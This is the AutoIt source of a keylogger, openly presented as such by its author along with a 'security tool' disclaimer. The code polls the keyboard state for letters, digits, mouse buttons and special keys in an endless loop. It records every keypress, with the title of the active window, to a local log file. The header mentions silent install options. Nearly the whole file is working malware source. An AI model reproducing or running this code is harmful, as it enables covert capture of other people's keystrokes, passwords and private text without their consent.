#CS This is a simple keylogger Created By Jason Zetter
	this is created as a security tool and i cannot be held responsible for any missuse of this program
	
	Help:
	/install - Installs the program with an interface
	/install /silent - installs the program with the defauld valuse in silent
	/help - displays this help box
	/uninstall - this removes the program and all the settings from your system WARNING this DOES remove the log files.
	
	This Program was created with the Awsome Freeware Basic programing language Auto-it!
	
	For updates and other Programs Created by Jazo-tools Send your browser to Http://www.jazo-online.com.au.tt
#CE
;-------------------------------------------------------------comandline code for help install and ninstall
;$hDll = DllOpen("user32.dll"); <-- near the start of your script
;Func _IsPressed()
;	[...]
;     DllCall($hDll, "int", "GetAsyncKeyState", "int", $hexKey)
;     [...]
;EndFunc
;------------------------------------------------Other Functions------------------
Func _IsPressed($hexKey)
	Local $aR, $bRv
	$hexKey = '0x' & $hexKey
	$aR = DllCall("user32", "int", "GetAsyncKeyState", "int", $hexKey)
	If $aR[0] <> 0 Then
		$bRv = 1
	Else
		$bRv = 0
	EndIf
	Return $bRv
EndFunc   ;==>_IsPressed
;------------------------------------------------
$file = FileOpen("logfile.TXT", 2)

;------------------------------------------------
Func Terminate()
	TrayTip(" Key Test", "Your System is no Longer Protected", 15, 3)
	Sleep(1000)
	Exit 0
EndFunc   ;==>Terminate

Opt("OnExitFunc", "Terminate")

;------------------------------------------------
Func _LogKeyPress($what2log)
	FileWrite($file, WinGetTitle("") & "  " & $what2log)
	Sleep(100)
EndFunc   ;==>_LogKeyPress
;------------------------------------------------
While 1

	If _IsPressed(41) Then _LogKeyPress("a")
	If _IsPressed(42) Then _LogKeyPress("b")
	If _IsPressed(43) Then _LogKeyPress("c")
	If _IsPressed(44) Then _LogKeyPress("d")
	If _IsPressed(45) Then _LogKeyPress("e")
	If _IsPressed(46) Then _LogKeyPress("f")
	If _IsPressed(47) Then _LogKeyPress("g")
	If _IsPressed(48) Then _LogKeyPress("h")
	If _IsPressed(49) Then _LogKeyPress("i")
	If _IsPressed('4a') Then _LogKeyPress("j")
	If _IsPressed('4b') Then _LogKeyPress("k")
	If _IsPressed('4c') Then _LogKeyPress("l")
	If _IsPressed('4d') Then _LogKeyPress("m")
	If _IsPressed('4e') = 1 Then _LogKeyPress("n")
	If _IsPressed('4f') Then _LogKeyPress("o")
	If _IsPressed(50) Then _LogKeyPress("p")
	If _IsPressed(51) Then _LogKeyPress("q")
	If _IsPressed(52) Then _LogKeyPress("r")
	If _IsPressed(53) Then _LogKeyPress("s")
	If _IsPressed(54) Then _LogKeyPress("t")
	If _IsPressed(55) Then _LogKeyPress("u")
	If _IsPressed(56) Then _LogKeyPress("v")
	If _IsPressed(57) Then _LogKeyPress("w")
	If _IsPressed(58) Then _LogKeyPress("x")
	If _IsPressed(59) Then _LogKeyPress("y")
	If _IsPressed('5a') Then _LogKeyPress("z")
	If _IsPressed('01') Then _LogKeyPress("{LEFT MOUSE}")
	If _IsPressed('02') Then _LogKeyPress("{RIGHT MOUSE}")
	If _IsPressed('08') Then _LogKeyPress("{BACKSPACE}")
	If _IsPressed('09') Then _LogKeyPress("{TAB}")
	If _IsPressed('0d') Then _LogKeyPress("{ENTER}")
	If _IsPressed('10') Then _LogKeyPress("{SHIFT}")
	If _IsPressed('11') Then _LogKeyPress("{CTRL}")
	If _IsPressed('12') Then _LogKeyPress("{ALT}")
	If _IsPressed('13') Then _LogKeyPress("{PAUSE}")
	If _IsPressed('14') Then _LogKeyPress("{CAPSLOCK}")
	If _IsPressed('1b') Then _LogKeyPress("{ESC}")
	If _IsPressed('20') Then _LogKeyPress(" ")
	If _IsPressed('21') Then _LogKeyPress("{PGUP}")
	If _IsPressed('22') Then _LogKeyPress("{PGDOWN}")
	If _IsPressed('23') Then _LogKeyPress("{END}")
	If _IsPressed('24') Then _LogKeyPress("{HOME}")
	If _IsPressed('25') Then _LogKeyPress("{LEFT ARROW}")
	If _IsPressed('26') Then _LogKeyPress("{UP ARROW}")
	If _IsPressed('27') Then _LogKeyPress("{RIGHT ARROW}")
	If _IsPressed('28') Then _LogKeyPress("{DOWN ARROW}")
	If _IsPressed('2c') Then _LogKeyPress("{PRNTSCRN}")
	If _IsPressed('2d') Then _LogKeyPress("{INSERT}")
	If _IsPressed('2e') Then _LogKeyPress("{DEL}")
	If _IsPressed('30') Then _LogKeyPress("0")
	If _IsPressed('31') Then _LogKeyPress("1")
	If _IsPressed('32') Then _LogKeyPress("2")
	If _IsPressed('33') Then _LogKeyPress("3")
	If _IsPressed('34') Then _LogKeyPress("4")
	If _IsPressed('35') Then _LogKeyPress("5")
	If _IsPressed('36') Then _LogKeyPress("6")
	If _IsPressed('37') Then _LogKeyPress("7")
	If _IsPressed('38') Then _LogKeyPress("8")
	If _IsPressed('39') Then _LogKeyPress("9")
WEnd

